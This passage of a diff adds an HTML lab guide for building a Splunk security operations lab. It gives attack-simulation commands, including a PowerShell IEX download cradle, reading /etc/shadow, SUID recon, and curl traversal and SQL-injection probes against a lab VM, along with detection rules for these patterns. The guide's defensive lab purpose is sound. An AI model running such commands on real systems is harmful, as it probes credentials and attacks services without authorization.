+<span class="c-green">net user</span> Administrator /active:yes
+<span class="c-cyan">1..6</span> | <span class="c-green">ForEach-Object</span> { <span class="c-green">net use</span> \\localhost\IPC$ /user:Administrator WrongPass 2>&amp;1 }</pre>
+      </div>
+    </article>
+
+    <article class="attack-card" aria-label="Attack 4: Suspicious PowerShell">
+      <div class="attack-header">
+        <div class="attack-title">⚡ Suspicious PowerShell Execution</div>
+        <span class="attack-severity sev-high" aria-label="High severity">HIGH</span>
+      </div>
+      <p class="attack-desc">Simulate common attacker techniques using PowerShell. Sysmon Event ID 1 (Process Create) and PowerShell Script Block Logging will capture these.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">powershell — suspicious but safe commands</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># Base64 encoded command (common obfuscation technique)</span>
+<span class="c-green">$encoded</span> = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(<span class="c-yellow">"Get-Process"</span>))
+<span class="c-green">powershell.exe -NoProfile -NonInteractive -EncodedCommand</span> $encoded
+
+<span class="c-dim"># Download cradle simulation (safe - downloads nothing harmful)</span>
+<span class="c-green">powershell -c</span> <span class="c-yellow">"IEX(New-Object Net.WebClient).DownloadString('http://example.com')"</span>
+
+<span class="c-dim"># Invoke-Expression with variable (living off the land)</span>
+<span class="c-green">$cmd</span> = <span class="c-yellow">"Get-LocalUser"</span>; <span class="c-green">Invoke-Expression</span> $cmd
+
+<span class="c-dim"># Verify in Splunk:</span>
+<span class="c-dim"># index=windows_logs EventCode=1 | eval suspicious=if(match(CommandLine,"(-enc|-EncodedCommand|IEX|Invoke-Expression)"),"YES","NO")</span></pre>
+      </div>
+    </article>
+
+    <article class="attack-card" aria-label="Attack 5: Linux Privilege Escalation Attempt">
+      <div class="attack-header">
+        <div class="attack-title">🔺 Linux Privilege Escalation Attempt</div>
+        <span class="attack-severity sev-medium" aria-label="Medium severity">MEDIUM</span>
+      </div>
+      <p class="attack-desc">Generate auditd events for sudo usage and SUID binary execution. Visible in auth.log and audit.log.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash — on Ubuntu VM</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># Trigger multiple sudo commands (generates auth log entries)</span>
+<span class="c-green">for i in</span> {1..10}; <span class="c-cyan">do</span>
+  <span class="c-green">sudo -l</span> 2>/dev/null
+  <span class="c-green">sudo whoami</span>
+  <span class="c-green">sudo cat</span> /etc/shadow 2>/dev/null || true
+  <span class="c-green">sleep</span> 0.5
+<span class="c-cyan">done</span>
+
+<span class="c-dim"># Find SUID binaries (attacker recon, generates audit events)</span>
+<span class="c-green">find /</span> <span class="c-cyan">-perm -4000</span> -type f 2>/dev/null
+
+<span class="c-dim"># Create new user (generates account management events)</span>
+<span class="c-green">sudo useradd</span> testattacker <span class="c-cyan">-m -s /bin/bash</span>
+<span class="c-green">sudo passwd</span> testattacker  <span class="c-dim"># set a password</span>
+<span class="c-green">sudo userdel</span> testattacker  <span class="c-dim"># clean up</span></pre>
+      </div>
+    </article>
+
+    <article class="attack-card" aria-label="Attack 6: Web Application Attack">
+      <div class="attack-header">
+        <div class="attack-title">🌐 Web Application Attack (Apache Target)</div>
+        <span class="attack-severity sev-info" aria-label="Info severity">INFO</span>
+      </div>
+      <p class="attack-desc">Simulate web attacks against Apache on the Ubuntu VM. Generates access_combined log entries with suspicious paths and user agents.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash — install apache first</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># On Ubuntu: install Apache</span>
+<span class="c-green">sudo apt install</span> apache2 <span class="c-cyan">-y</span>
+<span class="c-green">sudo systemctl start</span> apache2
+
+<span class="c-dim"># From attacker: simulate directory traversal and SQLi attempts</span>
+<span class="c-green">for path in</span> "../../../etc/passwd" "wp-admin" ".env" "phpinfo.php" "admin/login" "?id=1+UNION+SELECT+1,2,3--"; <span class="c-cyan">do</span>
+  <span class="c-green">curl -s</span> <span class="c-yellow">"http://UBUNTU_VM_IP/$path"</span> <span class="c-cyan">-o /dev/null</span> &amp;
+<span class="c-cyan">done</span>
+
+<span class="c-dim"># Simulate nikto web scanner behavior</span>
+<span class="c-green">curl -A</span> <span class="c-yellow">"Nikto/2.1.6"</span> http://UBUNTU_VM_IP/
+<span class="c-green">curl -A</span> <span class="c-yellow">"sqlmap/1.7"</span> <span class="c-yellow">"http://UBUNTU_VM_IP/?id=1"</span></pre>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- ===== PHASE 6 ===== -->
+<section class="phase" id="phase6" aria-labelledby="phase6-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">06</div>
+    <div class="phase-title-group">
+      <h2 id="phase6-title">Alerting, Correlation &amp; Best Practices</h2>
+      <div class="phase-tag">Saved Searches · Alert Actions · SOC Methodology</div>
+    </div>
+    <span class="phase-status optional" aria-label="Optional but recommended">Recommended</span>
+  </div>
+
+  <div class="steps">
+
+    <article class="step open" aria-label="Step 6.1: Configure Alerts">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="true">
+        <span class="step-num">6.1</span>
+        <h3>Configure Splunk Alerts for Key Security Events</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Splunk alerts fire when a search returns results matching your conditions. Here are the most 
+          important alerts for your SOC lab.
+        </p>
+        <table aria-label="Recommended Splunk alerts">
+          <thead>
+            <tr>
+              <th>Alert Name</th>
+              <th>Trigger Condition</th>
+              <th>Severity</th>
+              <th>Schedule</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Brute Force SSH</td>
+              <td>&gt;10 failed logins from same IP in 5 min</td>
+              <td style="color:var(--accent-red);">Critical</td>
+              <td>Every 5 min</td>
+            </tr>
+            <tr>
+              <td>Windows Account Lockout</td>
+              <td>EventCode=4740 any occurrence</td>
+              <td style="color:var(--accent-orange);">High</td>
+              <td>Real-time</td>
+            </tr>
+            <tr>
+              <td>Suspicious PowerShell</td>
+              <td>CommandLine contains -EncodedCommand or IEX</td>
+              <td style="color:var(--accent-orange);">High</td>
+              <td>Every 15 min</td>
+            </tr>
+            <tr>
+              <td>New Local User Created</td>
+              <td>EventCode=4720 or "new user" in auth.log</td>
+              <td style="color:var(--accent-yellow);">Medium</td>
+              <td>Every 1 hr</td>
+            </tr>
+            <tr>
+              <td>UFW Spike (Port Scan)</td>
+              <td>&gt;100 UFW BLOCK events from same IP in 1 min</td>
+              <td style="color:var(--accent-orange);">High</td>
+              <td>Every 1 min</td>
+            </tr>
+            <tr>
+              <td>Sysmon Network to Rare Port</td>
+              <td>EventCode=3 DestinationPort IN (4444,1337,31337)</td>
+              <td style="color:var(--accent-red);">Critical</td>
+              <td>Real-time</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">spl — brute force alert query</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Save this as an alert: "Brute Force SSH Detection"</span>
+<span class="spl-keyword">index</span>=linux_logs <span class="spl-field">sourcetype</span>=linux_secure <span class="spl-string">"Failed password"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">rex</span> <span class="spl-string">"from (?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">bucket</span> _time span=5m
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">by</span> src_ip, _time
+<span class="spl-pipe">|</span> <span class="spl-keyword">where</span> count > 10</pre>
+        </div>
+
+        <p class="step-desc">To create an alert in Splunk UI:</p>
+        <ul class="checklist" aria-label="Alert creation steps">
+          <li>Run the query in <strong>Search &amp; Reporting</strong></li>
+          <li>Click <strong>Save As → Alert</strong></li>
+          <li>Set <strong>Alert Type</strong>: Scheduled (cron) or Real-time</li>
+          <li>Set <strong>Trigger conditions</strong>: Number of results is greater than 0</li>
+          <li>Add <strong>Alert Action</strong>: Add to Triggered Alerts (visible in SOC dashboard)</li>
+          <li>Set <strong>Severity</strong> level for the triggered alert</li>
+        </ul>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 6.2: Correlation Searches">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">6.2</span>
+        <h3>Advanced Correlation Searches</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Correlation searches connect events across multiple sources to detect complex attack patterns.
+          These are the hallmark of a mature SOC.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">spl — lateral movement detection</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Detect: failed Linux SSH logins followed by Windows activity from same IP</span>
+<span class="spl-keyword">index</span>=linux_logs <span class="spl-string">"Failed password"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">rex</span> <span class="spl-string">"from (?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">as</span> linux_failures <span class="spl-keyword">by</span> src_ip
+<span class="spl-pipe">|</span> <span class="spl-keyword">join</span> src_ip [
+    <span class="spl-keyword">search</span> <span class="spl-keyword">index</span>=windows_logs <span class="spl-field">EventCode</span>=4624
+    <span class="spl-pipe">|</span> <span class="spl-keyword">rename</span> IpAddress <span class="spl-keyword">as</span> src_ip
+    <span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">as</span> win_logins <span class="spl-keyword">by</span> src_ip
+]
+<span class="spl-pipe">|</span> <span class="spl-keyword">where</span> linux_failures > 5 AND win_logins > 0
+<span class="spl-pipe">|</span> <span class="spl-keyword">eval</span> alert=<span class="spl-string">"Possible lateral movement from: "</span>.src_ip</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">spl — impossible travel detection</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Detect same user logging in from different countries within 1 hour</span>
+<span class="spl-keyword">index</span>=windows_logs <span class="spl-field">EventCode</span>=4624 Account_Name!=<span class="spl-string">"SYSTEM"</span> Account_Name!=<span class="spl-string">"ANONYMOUS LOGON"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">iplocation</span> IpAddress
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">dc</span>(Country) <span class="spl-keyword">as</span> countries <span class="spl-func">values</span>(Country) <span class="spl-keyword">as</span> country_list <span class="spl-keyword">by</span> Account_Name
+<span class="spl-pipe">|</span> <span class="spl-keyword">where</span> countries > 1
+<span class="spl-pipe">|</span> <span class="spl-keyword">eval</span> alert=<span class="spl-string">"Impossible travel: "</span>.Account_Name.<span class="spl-string">" from: "</span>.<span class="spl-func">mvjoin</span>(country_list,<span class="spl-string">", "</span>)</pre>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 6.3: Best Practices">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">6.3</span>
+        <h3>SOC Best Practices &amp; Next Steps</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <div class="two-col">
+          <div class="mini-card">
+            <div class="mini-card-title">Splunk Apps to Install</div>
+            <ul class="checklist" style="margin-top:8px;" aria-label="Recommended Splunk apps">
+              <li>Splunk Security Essentials (free)</li>
+              <li>Splunk Add-on for Windows</li>
+              <li>Splunk Add-on for Linux</li>
+              <li>Sysmon Add-on (TA-microsoft-sysmon)</li>
+              <li>MITRE ATT&amp;CK App for Splunk</li>
+            </ul>
+          </div>
+          <div class="mini-card">
+            <div class="mini-card-title">Data Normalization</div>
+            <ul class="checklist" style="margin-top:8px;" aria-label="Data normalization tips">
+              <li>Use CIM (Common Info Model) for cross-source searches</li>
+              <li>Tag data models: Authentication, Network_Traffic, Endpoint</li>
+              <li>Use props.conf/transforms.conf for custom field extractions</li>
+              <li>Normalize timestamps to UTC</li>
+            </ul>
+          </div>
+          <div class="mini-card">
+            <div class="mini-card-title">Performance Tips</div>
+            <ul class="checklist" style="margin-top:8px;" aria-label="Performance tips">
+              <li>Use specific index= in every search</li>
+              <li>Add earliest= and latest= time constraints</li>
+              <li>Use tstats for fast index-level searches</li>
+              <li>Schedule heavy reports, don't run ad-hoc</li>
+            </ul>
+          </div>
+          <div class="mini-card">
+            <div class="mini-card-title">Lab Expansion Ideas</div>
+            <ul class="checklist" style="margin-top:8px;" aria-label="Lab expansion ideas">
+              <li>Add Kali Linux as dedicated attack VM</li>
+              <li>Deploy Metasploitable as vulnerable target</li>
+              <li>Set up Suricata IDS feeding Splunk</li>
+              <li>Integrate pfSense firewall logs</li>
+              <li>Add Elastic Stack for comparison</li>
+            </ul>
+          </div>
+        </div>
+        <div class="info-box tip">
+          <span class="info-icon">✓</span>
+          <div><strong>MITRE ATT&amp;CK Mapping:</strong> Map each Splunk alert to a MITRE ATT&amp;CK technique (e.g., Brute Force = T1110, PowerShell = T1059.001). This demonstrates advanced SOC maturity in demonstrations.</div>
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+</main>
+
+<!-- Progress Bar -->
+<div class="progress-bar" role="complementary" aria-label="Reading progress">
+  <div class="progress-label">
+    <span>PROGRESS</span>
+    <span id="progress-pct">0%</span>
+  </div>
+  <div class="progress-track">
+    <div class="progress-fill" id="progress-fill"></div>
+  </div>
+</div>
+
+<footer role="contentinfo">
+  <p>SOC Lab Guide · Built for <span>Splunk Enterprise</span> · VMware Lab Environment · <span>Handle with care — lab use only</span></p>
+</footer>
+
+<script>
+function toggleStep(header) {
+  const step = header.closest('.step');
+  const isOpen = step.classList.contains('open');
+  step.classList.toggle('open', !isOpen);
+  header.setAttribute('aria-expanded', !isOpen);
+}
+
+document.querySelectorAll('.step-header').forEach(h => {
+  h.addEventListener('keydown', e => {
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggleStep(h); }
+  });
+});
+
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'COPIED';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// Scroll progress
+window.addEventListener('scroll', () => {
+  const total = document.body.scrollHeight - window.innerHeight;
+  const pct = Math.round((window.scrollY / total) * 100);
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('progress-pct').textContent = pct + '%';
+});
+
+// Active nav phase highlighting
+const phases = document.querySelectorAll('section.phase');
+const navLinks = document.querySelectorAll('.nav-phases a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      navLinks.forEach(a => {
+        a.classList.toggle('active', a.getAttribute('href') === '#' + id);
+      });
+    }
+  });
+}, { threshold: 0.3 });
+phases.forEach(p => observer.observe(p));
+
+// Stagger phase animations
+const animObserver = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) { e.target.style.animationPlayState = 'running'; }
+  });
+}, { threshold: 0.1 });
+document.querySelectorAll('.phase').forEach((p, i) => {
+  p.style.animationDelay = (i * 0.1) + 's';
+  p.style.animationPlayState = 'paused';
+  animObserver.observe(p);
+});
+</script>
+</body>
+</html>
